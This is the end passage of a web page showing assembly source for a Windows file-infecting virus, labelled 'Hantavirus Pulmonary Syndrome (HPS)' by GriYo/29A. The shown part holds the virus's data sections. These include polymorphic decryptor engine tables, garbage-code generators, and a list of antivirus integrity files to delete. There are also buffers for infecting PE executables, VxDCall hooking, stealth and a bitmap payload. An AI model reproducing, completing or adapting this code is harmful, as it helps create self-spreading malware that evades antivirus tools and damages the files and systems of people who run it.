</span><span class="sc5">x_add_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">2Ch</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_add_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_add_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_sub_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_byte</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">34h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_word</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">
</span><span class="sc5">x_xor_reg_dword</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc4">,</span><span class="sc5">MAGIC_ENDKEY</span><span class="sc0">

                </span><span class="sc1">;Format for each style-table entry:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">; 00h - DWORD - Address of generator</span><span class="sc0">
                </span><span class="sc1">; 04h - DWORD - Address of generated subroutine or</span><span class="sc0">
                </span><span class="sc1">;               00000000h if not yet generated</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">style_table</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_get_delta</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_load_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_decrypt</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_step</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_next_ctr</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc1">;Garbage code generators</span><span class="sc0">

</span><span class="sc5">tbl_garbage</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gen_save_code</span><span class="sc0">         </span><span class="sc1">;clc stc cmc cld std</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg32imm</span><span class="sc0">         </span><span class="sc1">;mov reg32,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg16imm</span><span class="sc0">         </span><span class="sc1">;mov reg16,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movreg8imm</span><span class="sc0">          </span><span class="sc1">;mov reg8,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg32</span><span class="sc0">         </span><span class="sc1">;mov reg32,reg32</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg16</span><span class="sc0">         </span><span class="sc1">;mov reg16,reg16</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movregreg8</span><span class="sc0">          </span><span class="sc1">;mov reg8,reg8</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm32</span><span class="sc0">        </span><span class="sc1">;math reg32,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm16</span><span class="sc0">        </span><span class="sc1">;math reg16,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_mathregimm8</span><span class="sc0">         </span><span class="sc1">;math reg8,imm</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_push_g_pop</span><span class="sc0">          </span><span class="sc1">;push reg/garbage/pop reg</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_call_cont</span><span class="sc0">           </span><span class="sc1">;call/garbage/pop</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_u</span><span class="sc0">              </span><span class="sc1">;jump/rnd block</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_jump_c</span><span class="sc0">              </span><span class="sc1">;jump conditional/garbage</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">g_movzx_movsx</span><span class="sc0">         </span><span class="sc1">;movzx/movsx reg32,reg16</span><span class="sc0">

</span><span class="sc5">end_garbage</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Virus initialized data</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">szKernel32</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"KERNEL32.dll"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">;Used for kernel scanning</span><span class="sc0">

</span><span class="sc5">rnd32_seed</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">            </span><span class="sc1">;Seed for random number generator</span><span class="sc0">

</span><span class="sc5">del_fileptr</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szAvData_00</span><span class="sc0">   </span><span class="sc1">;Filenames to delete</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szAvData_01</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szAvData_02</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">szAvData_03</span><span class="sc0">

</span><span class="sc5">szAvData_00</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ANTI-VIR.DAT"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">;Thunderbyte</span><span class="sc0">
</span><span class="sc5">szAvData_01</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CHKLIST.MS"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">     </span><span class="sc1">;MsAv</span><span class="sc0">
</span><span class="sc5">szAvData_02</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"AVP.CRC"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;Avp</span><span class="sc0">
</span><span class="sc5">szAvData_03</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"IVB.NTZ"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;Invircible</span><span class="sc0">

</span><span class="sc5">szAuth</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" &lt; Hantavirus Pulmonary Syndrome (HPS) "</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Virus BioCoded by GriYo / 29A &gt; "</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">

                </span><span class="sc9">align</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
                
</span><span class="sc5">inf_end</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Poly engine uninitialized data</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">ptr_disp</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Displacement from index</span><span class="sc0">
</span><span class="sc5">disp2disp</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Displacement over displacement </span><span class="sc0">
</span><span class="sc5">end_value</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Index end value</span><span class="sc0">
</span><span class="sc5">delta_call</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Used into delta_offset routines</span><span class="sc0">
</span><span class="sc5">loop_point</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Start address of decryption loop</span><span class="sc0">
</span><span class="sc5">entry_point</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Entry point to decryptor code</span><span class="sc0">
</span><span class="sc5">decryptor_size</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Size of generated decryptor</span><span class="sc0">
</span><span class="sc5">crypt_key</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Encryption key</span><span class="sc0">
</span><span class="sc5">oper_size</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Size used (1=Byte 2=Word 4=Dword)</span><span class="sc0">
</span><span class="sc5">index_mask</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Mask of register used as index</span><span class="sc0">
</span><span class="sc5">counter_mask</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Mask of register used as counter</span><span class="sc0">
</span><span class="sc5">build_flags</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Some decryptor flags</span><span class="sc0">
</span><span class="sc5">recursive_level</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">          </span><span class="sc1">;Garbage recursive layer</span><span class="sc0">

                </span><span class="sc1">;Decryptor flags aliases</span><span class="sc0">

</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">CRYPT_CMPCTR</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">CRYPT_SIMPLEX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc5">CRYPT_COMPLEX</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

                </span><span class="sc1">;Virus uninitialized data</span><span class="sc0">

</span><span class="sc5">scan_addr</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Current memory address for our scanner</span><span class="sc0">
</span><span class="sc5">a_VxDCall</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;VxDCall function entry-point</span><span class="sc0">
</span><span class="sc5">hook_status</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Flag to prevent reentrancy</span><span class="sc0">
</span><span class="sc5">file_attrib</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Original file attributes</span><span class="sc0">
</span><span class="sc5">file_time</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Original file time</span><span class="sc0">
</span><span class="sc5">file_date</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Original file date</span><span class="sc0">
</span><span class="sc5">ptr_filename</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Path end, filename start</span><span class="sc0">
</span><span class="sc5">last_checksum</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Checksum of filename</span><span class="sc0">
</span><span class="sc5">padding_block</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Numbers of bytes written for size padding</span><span class="sc0">
</span><span class="sc5">mem_address</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Virus position in memory</span><span class="sc0">
</span><span class="sc5">bmp_address</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Storage for .BMP handling rotuines</span><span class="sc0">
</span><span class="sc5">bmp_active</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Payload switch</span><span class="sc0">
</span><span class="sc5">bmp_pages</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">    </span><span class="sc1">;Size of bitmap in pages</span><span class="sc0">

</span><span class="sc5">VxDCall_code</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">                </span><span class="sc1">;16:32 ptr to VxDCall INT 30h</span><span class="sc0">

</span><span class="sc5">target_filename</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;Filename to infect</span><span class="sc0">
                
</span><span class="sc5">stealth_this</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                    </span><span class="sc1">;Bytes written to file</span><span class="sc0">

</span><span class="sc5">msdos_header</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_DOS_HEADER</span><span class="sc0"> \    </span><span class="sc1">;MsDos header</span><span class="sc0">
                </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">pe_signature</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">                    </span><span class="sc1">;This holds the PE signature</span><span class="sc0">

</span><span class="sc5">pe_header</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc0"> \   </span><span class="sc1">;Here comes the PE header</span><span class="sc0">
                </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">optional_header</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_NT_OPTIONAL_HEADER</span><span class="sc0"> \
                </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">;Holds the optional Header</span><span class="sc0">

</span><span class="sc5">section_header</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0"> \</span><span class="sc1">;Section header of last </span><span class="sc0">
                </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">                       </span><span class="sc1">;section in file</span><span class="sc0">

</span><span class="sc5">mem_end</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">                   </span><span class="sc1">;End of virus portable code</span><span class="sc0">

</span><span class="sc5">virus_copy</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">inf_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">;Virus copy for infections</span><span class="sc0">
</span><span class="sc5">poly_max_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">                       </span><span class="sc1">;Buffer size</span><span class="sc0">
</span><span class="sc5">poly_buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">poly_max_size</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;Buffer for poly decryptor</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">virseg</span><span class="sc0">          </span><span class="sc9">ends</span><span class="sc0">

                </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">host_entry</span><span class="sc0">
</span></div></body>
</html>
